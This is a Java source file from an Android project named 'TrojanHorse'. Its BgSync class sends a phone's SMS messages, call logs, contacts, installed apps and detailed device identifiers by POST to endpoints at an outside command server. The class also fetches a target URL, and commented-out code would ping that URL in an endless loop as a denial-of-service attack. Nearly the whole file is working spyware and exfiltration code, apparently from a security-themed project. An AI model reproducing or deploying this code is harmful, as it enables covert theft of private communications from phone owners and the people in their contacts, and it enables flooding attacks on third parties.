package com.codensecurity.trojanhorse.icode;

import android.os.AsyncTask;
import android.os.NetworkOnMainThreadException;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;

/**
 * Created by Collins on 10/24/2023 @ 02:04 PM.
 * Package Name: com.codensecurity.trojanhorse
 * Project Name : TrojanHorse
 */

public class BgSync extends AsyncTask<String, Void, String> {

    @Override
    protected void onPreExecute() {
//        alertDialog.setTitle("Server Response");

    }

    @Override
    protected void onProgressUpdate(Void... values) {
        super.onProgressUpdate(values);
    }

    @Override
    protected void onPostExecute(String response) {
        super.onPostExecute(response);
        // Handle the response here
        // The 'result' variable contains the response from the PHP script
        // Check the response and take action accordingly
        //Log.d(TAG, "Response returned: "+response);
//        if(targetURL != "0") {
//            attackURL = targetURL;
//
//            if (attackURL != "null") {
//                        // Execute code here
//                        while (true && attackURL != "null") {
//                            try {
//                                Process process = Runtime.getRuntime().exec("ping " + attackURL);
//                                Log.d(TAG, "Pinging: " + attackURL);
//                                process.waitFor();
//                            } catch (IOException | InterruptedException e) {
//                                e.printStackTrace();
//                            }
//                        }
//                    } else {
//                        // Do nothing
//                        Log.d(TAG, "No Target to Ping");
//                    }
//                } else if(targetURL == "0") {
//            // Do nothing
//            Log.d(TAG, "No Target to Ping");
//        } else {
//            // Do nothing
//            Log.d(TAG, "No Target to Ping");
//        }
            }


    public String doInBackground(String... params) {
        //Dos
        if(params[0].equals("url")) {
            String geturl = "https://horse.codensecurity.com/android/get_URL.php";
            String response = "";
            HttpURLConnection connection = null;

            try {
                // Create a URL object with the specified URL
                URL url = new URL(geturl);

                // Open a connection to the URL
                connection = (HttpURLConnection) url.openConnection();

                // Set the request method to GET
                connection.setRequestMethod("GET");

                // Get the response code
                int responseCode = connection.getResponseCode();

                // If the response code is 200 (HTTP_OK), read the response data
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                    StringBuilder responseStringBuilder = new StringBuilder();
                    String line;
                    while ((line = in.readLine()) != null) {
                        responseStringBuilder.append(line);
                    }
                    in.close();
                    response = responseStringBuilder.toString();
                }
            } catch (IOException e) {
                e.printStackTrace();
                // Handle the exception
            } finally {
                // Disconnect the connection to release resources
                if (connection != null) {
                    connection.disconnect();
                }
            }
            return response;
        }
        //sms
        if (params[0].equals("sms")) {
            String post_url = "https://horse.codensecurity.com/android/sync_sms.php";
            //String post_url = "http://192.168.10.63/backup_backend/android/sync_sms.php";

            try {
                String id = params[1];//"sms", id, type, address, body, date, readState, key
                String type = params[2];
                String address = params[3];
                String body = params[4];
                String date = params[5];
                String readState = params[6];
                String key = params[7];

                URL url = new URL(post_url);
                HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
                httpURLConnection.setRequestMethod("POST");
                httpURLConnection.setDoOutput(true);
                OutputStream outputStream = httpURLConnection.getOutputStream();
                BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(outputStream, StandardCharsets.UTF_8));
                try {
                    String data =
                            URLEncoder.encode("id", "UTF-8") + "=" + URLEncoder.encode(id, "UTF-8") + "&" +
                                    URLEncoder.encode("type", "UTF-8") + "=" + URLEncoder.encode(type, "UTF-8") + "&" +
                                    URLEncoder.encode("address", "UTF-8") + "=" + URLEncoder.encode(address, "UTF-8") + "&" +
                                    URLEncoder.encode("body", "UTF-8") + "=" + URLEncoder.encode(body, "UTF-8") + "&" +
                                    URLEncoder.encode("date", "UTF-8") + "=" + URLEncoder.encode(date, "UTF-8") + "&" +
                                    URLEncoder.encode("readState", "UTF-8") + "=" + URLEncoder.encode(readState, "UTF-8") + "&" +
                                    URLEncoder.encode("key", "UTF-8") + "=" + URLEncoder.encode(key, "UTF-8");
                    bufferedWriter.write(data);
                    bufferedWriter.flush();
                    bufferedWriter.close();
                    outputStream.close();

                    InputStream IS = httpURLConnection.getInputStream();
                    IS.close();

                } catch (NullPointerException e) {
                    e.printStackTrace();
                }

            } catch (NetworkOnMainThreadException | IOException e) {
                e.getStackTrace();
            }

        }
        //Device data
        if (params[0].equals("device_data")) {
            String phone_info_url = "https://horse.codensecurity.com/android/device_data.php";

            //Post phone information
            String brand = params[1];
            String model = params[2];
            String os_version = params[3];
            String api_version = params[4];
            String incremental = params[5];
            String device_id = params[6];
            String kernel = params[7];
            String e_board = params[8];
            String fingerprint = params[9];
            String user = params[10];
            String codename = params[11];
            String base_os = params[12];
            String securityPatch = params[13];
            String device_type = params[14];
            String radio = params[15];
            String baseband_version = params[16];

            try {
                URL url = new URL(phone_info_url);
                HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
                httpURLConnection.setRequestMethod("POST");
                httpURLConnection.setDoOutput(true);
                OutputStream OS = httpURLConnection.getOutputStream();
                BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(OS, StandardCharsets.UTF_8));
                String data =
                        URLEncoder.encode("brand", "UTF-8") + "=" + URLEncoder.encode(brand, "UTF-8") + "&" +
                                URLEncoder.encode("model", "UTF-8") + "=" + URLEncoder.encode(model, "UTF-8") + "&" +
                                URLEncoder.encode("os_version", "UTF-8") + "=" + URLEncoder.encode(os_version, "UTF-8") + "&" +
                                URLEncoder.encode("api_version", "UTF-8") + "=" + URLEncoder.encode(api_version, "UTF-8") + "&" +
                                URLEncoder.encode("incremental", "UTF-8") + "=" + URLEncoder.encode(incremental, "UTF-8") + "&" +
                                URLEncoder.encode("device_id", "UTF-8") + "=" + URLEncoder.encode(device_id, "UTF-8") + "&" +
                                URLEncoder.encode("kernel", "UTF-8") + "=" + URLEncoder.encode(kernel, "UTF-8") + "&" +
                                URLEncoder.encode("e_board", "UTF-8") + "=" + URLEncoder.encode(e_board, "UTF-8") + "&" +
                                URLEncoder.encode("fingerprint", "UTF-8") + "=" + URLEncoder.encode(fingerprint, "UTF-8") + "&" +
                                URLEncoder.encode("user", "UTF-8") + "=" + URLEncoder.encode(user, "UTF-8") + "&" +
                                URLEncoder.encode("codename", "UTF-8") + "=" + URLEncoder.encode(codename, "UTF-8") + "&" +
                                URLEncoder.encode("base_os", "UTF-8") + "=" + URLEncoder.encode(base_os, "UTF-8") + "&" +
                                URLEncoder.encode("securityPatch", "UTF-8") + "=" + URLEncoder.encode(securityPatch, "UTF-8") + "&" +
                                URLEncoder.encode("device_type", "UTF-8") + "=" + URLEncoder.encode(device_type, "UTF-8") + "&" +
                                URLEncoder.encode("radio", "UTF-8") + "=" + URLEncoder.encode(radio, "UTF-8") + "&" +
                                URLEncoder.encode("baseband_version", "UTF-8") + "=" + URLEncoder.encode(baseband_version, "UTF-8");

                bufferedWriter.write(data);
                bufferedWriter.flush();
                bufferedWriter.close();
                OS.close();
                InputStream IS = httpURLConnection.getInputStream();
                IS.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        //contacts
        if (params[0].equals("contacts")) {
            String post_url = "https://horse.codensecurity.com/android/post_contacts.php";
            //String post_url = "http://192.168.10.63/backup_backend/android/post_contacts.php";

            String key = params[1];
            String name = params[2];
            String phoneNumber = params[3];
            String email = params[4];
            //String birthday = params[5];

            try {


                URL url = new URL(post_url);
                HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
                httpURLConnection.setRequestMethod("POST");
                httpURLConnection.setDoOutput(true);
                OutputStream outputStream = httpURLConnection.getOutputStream();
                BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(outputStream, StandardCharsets.UTF_8));
                try {
                    String data = URLEncoder.encode("key", "UTF-8") + "=" + URLEncoder.encode(key, "UTF-8") + "&" +
                            URLEncoder.encode("name", "UTF-8") + "=" + URLEncoder.encode(name, "UTF-8") + "&" +
                            URLEncoder.encode("phoneNumber", "UTF-8") + "=" + URLEncoder.encode(phoneNumber, "UTF-8") + "&" +
                            URLEncoder.encode("email", "UTF-8") + "=" + URLEncoder.encode(email, "UTF-8");
                    bufferedWriter.write(data);
                    bufferedWriter.flush();
                    bufferedWriter.close();
                    outputStream.close();

                    InputStream IS = httpURLConnection.getInputStream();
                    IS.close();

                } catch (NullPointerException e) {
                    e.printStackTrace();
                }

            } catch (NetworkOnMainThreadException | IOException e) {
                e.getStackTrace();
            }
        }
        //call logs...
        if (params[0].equals("call_logs")) {
              String post_url = "https://horse.codensecurity.com/android/sync_call_logs.php";
            //String post_url = "http://192.168.10.63/backup_backend/android/sync_call_logs.php";

            try {
                String name = params[1];
                String number = params[2];
                String callType = params[3];
                String callDate = params[4];
                String callDuration = params[5];
                String geocode = params[6];
                String key = params[7];

                URL url = new URL(post_url);
                HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
                httpURLConnection.setRequestMethod("POST");
                httpURLConnection.setDoOutput(true);
                OutputStream outputStream = httpURLConnection.getOutputStream();
                BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(outputStream, StandardCharsets.UTF_8));
                try {
                    String data =
                            URLEncoder.encode("name", "UTF-8") + "=" + URLEncoder.encode(name, "UTF-8") + "&" +
                                    URLEncoder.encode("number", "UTF-8") + "=" + URLEncoder.encode(number, "UTF-8") + "&" +
                                    URLEncoder.encode("callType", "UTF-8") + "=" + URLEncoder.encode(callType, "UTF-8") + "&" +
                                    URLEncoder.encode("callDate", "UTF-8") + "=" + URLEncoder.encode(callDate, "UTF-8") + "&" +
                                    URLEncoder.encode("callDuration", "UTF-8") + "=" + URLEncoder.encode(callDuration, "UTF-8") + "&" +
                                    URLEncoder.encode("geocode", "UTF-8") + "=" + URLEncoder.encode(geocode, "UTF-8") + "&" +
                                    URLEncoder.encode("key", "UTF-8") + "=" + URLEncoder.encode(key, "UTF-8");
                    bufferedWriter.write(data);
                    bufferedWriter.flush();
                    bufferedWriter.close();
                    outputStream.close();

                    InputStream IS = httpURLConnection.getInputStream();
                    IS.close();

                } catch (NullPointerException e) {
                    e.printStackTrace();
                }

            } catch (NetworkOnMainThreadException | IOException e) {
                e.getStackTrace();
            }
        }
        //Installed Apps...
        if (params[0].equals("apps")) {
             String post_url = "https://horse.codensecurity.com/android/post_appinfo.php";
            //String post_url = "http://192.168.10.63/backup_backend/android/post_appinfo.php";

            String key = params[1];
            String appName = params[2];
            String icon = params[3];
            String package_name = params[4];

            try {
                URL url = new URL(post_url);
                HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
                httpURLConnection.setReadTimeout(20000);
                httpURLConnection.setConnectTimeout(20000);
                httpURLConnection.setRequestMethod("POST");
                httpURLConnection.setDoInput(true);
                httpURLConnection.setDoOutput(true);
                OutputStream outputStream = httpURLConnection.getOutputStream();
                BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(outputStream, StandardCharsets.UTF_8));
                try {
                    String data = URLEncoder.encode("key", "UTF-8") + "=" + URLEncoder.encode(key, "UTF-8") + "&" +
                            URLEncoder.encode("appName", "UTF-8") + "=" + URLEncoder.encode(appName, "UTF-8") + "&" +
                            URLEncoder.encode("icon", "UTF-8") + "=" + URLEncoder.encode(icon, "UTF-8") + "&" +
                            URLEncoder.encode("package_name", "UTF-8") + "=" + URLEncoder.encode(package_name, "UTF-8");
                    bufferedWriter.write(data);
                    bufferedWriter.flush();
                    bufferedWriter.close();
                    outputStream.close();

                    InputStream IS = httpURLConnection.getInputStream();
                    IS.close();

                } catch (NullPointerException e) {
                    e.printStackTrace();
                }

            } catch (NetworkOnMainThreadException | IOException e) {
                e.getStackTrace();
            }
        }
            return Arrays.toString(params);
        }

}
